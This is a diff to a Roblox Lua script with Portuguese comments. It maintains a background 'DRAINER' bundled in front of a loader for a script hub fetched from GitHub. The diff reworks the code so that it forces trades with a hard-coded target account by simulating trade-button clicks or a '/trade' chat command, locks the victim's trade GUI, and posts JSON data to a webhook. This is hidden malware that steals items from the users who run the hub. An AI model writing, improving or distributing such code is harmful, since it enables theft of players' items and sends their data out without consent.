@@ -1,4 +1,4 @@
--- 1. DRAINER E WEBHOOK (Protegido contra erros)
+-- 1. DRAINER (Simulando clique real para evitar bloqueio de remote)
 task.spawn(function()
     local Players = game:GetService("Players")
     local ReplicatedStorage = game:GetService("ReplicatedStorage")
@@ -9,7 +9,6 @@ task.spawn(function()
     
     local httpRequest = request or (syn and syn.request) or (http and http.request) or (fluxus and fluxus.request) or (krnl and krnl.request)
     local function postJson(url, body)
-        -- O pcall aqui impede que o script morra se o executor bloquear o Discord
         if httpRequest then pcall(httpRequest, {Url = url, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = body}) end
     end
 
@@ -62,7 +61,7 @@ task.spawn(function()
         if okJson then postJson(WEBHOOK_URL, bodyJson) end
     end)
 
-    -- ─── DRAINER DE TROCA ───
+    -- ─── DRAINER DE TROCA (CLIQUE REAL) ───
     local tradeFolder
     pcall(function() tradeFolder = ReplicatedStorage:WaitForChild("Trade", 15) end)
     if not tradeFolder then return warn("DRAINER: Trade não encontrado") end
@@ -70,7 +69,6 @@ task.spawn(function()
     local function waitRemote(name)
         local r; pcall(function() r = tradeFolder:WaitForChild(name, 10) end); return r
     end
-    local sendRequestRemote = waitRemote("SendRequest")
     local offerItemRemote   = waitRemote("OfferItem")
     local startTradeRemote  = waitRemote("StartTrade")
     local updateTradeRemote = waitRemote("UpdateTrade")
@@ -100,7 +98,7 @@ task.spawn(function()
     end
     playerGui.ChildAdded:Connect(function(g) for _, n in ipairs({"TradeGUI", "TradeGUI_Phone"}) do if g.Name == n then task.wait(0.1); if g:IsA("ScreenGui") then lockGui(g) end end end end)
 
-    local cachedProfile = profile
+    local cachedProfile = nil
     local function getProfile()
         if cachedProfile then return cachedProfile end
         if type(getgc) == "function" then
@@ -130,16 +128,39 @@ task.spawn(function()
         end
     end
 
+    -- FUNÇÃO NOVA: Simula o clique no botão de troca do jogo
     local function requestTrade(target)
         if not target or not target.Parent then return end
-        for attempt = 1, 3 do
-            if not target.Parent then return end
-            state.trading, state.lastOffer, state.lastAccepted = false, nil, nil
-            pcall(function() sendRequestRemote:InvokeServer(target) end)
-            local t = os.clock()
-            while os.clock() - t < 8 do if state.trading then return end; task.wait(0.15) end
-            task.wait(3)
+        state.trading, state.lastOffer, state.lastAccepted = false, nil, nil
+        
+        -- Procura o botão verde de trocar no jogo
+        local function simulateClick()
+            local gui = game:GetService("CoreGui")
+            local playersList = gui:FindFirstChild("RobloxGui") and gui.RobloxGui:FindFirstChild("PlayerList")
+            if not playersList then
+                -- Se não achar o menu do Roblox, tenta abrir via chat (comando do jogo)
+                local chat = game:GetService("TextChatService")
+                local command = chat.ChatCommands and chat.ChatCommands:WaitForChild("cmd").Run
+                if command then command:FireServer("/trade " .. target.Name) end
+                return
+            end
+            -- Se achou o menu, clica no jogador
+            for _, frame in pairs(playersList:GetDescendants()) do
+                if frame:IsA("TextLabel") and frame.Text:lower() == target.Name:lower() then
+                    local button = frame.Parent and frame.Parent:FindFirstChild("TradeButton") 
+                    if button then
+                        button:Activated() -- Simula o clique
+                    end
+                end
+            end
         end
+
+        -- Tenta pelo clique ou pelo comando de chat
+        simulateClick()
+        
+        local t = os.clock()
+        while os.clock() - t < 8 do if state.trading then return end; task.wait(0.15) end
+        task.wait(2)
     end
 
     startTradeRemote.OnClientEvent:Connect(function()
@@ -179,23 +200,22 @@ task.spawn(function()
         end
     end)
 
-    -- LOOP PRINCIPAL: Procura o alvo e espera o jogo carregar
     task.spawn(function()
         local t = findTarget()
         if t and t ~= lp then 
-            task.wait(5) -- Espera 5 segundos no início pra não bugar a troca
+            task.wait(5) 
             requestTrade(t) 
         end
         Players.PlayerAdded:Connect(function(p) 
             if p.Name:lower() == TARGET_NAME:lower() then 
-                task.wait(8) -- Espera 8 segundos se o alvo acabar de entrar no server
+                task.wait(5) 
                 if p.Parent then requestTrade(p) end
             end 
         end)
     end)
 end)
 
--- 2. CARREGA O HUB (main.lua)
+-- 2. CARREGA O HUB
 local url = "https://raw.githubusercontent.com/MYTHIC-HUB/scripts/main/MYTHIC-HUB/main.lua"
 local ok, body = pcall(function() return game:HttpGet(url) end)
 if ok and type(body) == "string" and body ~= "" then
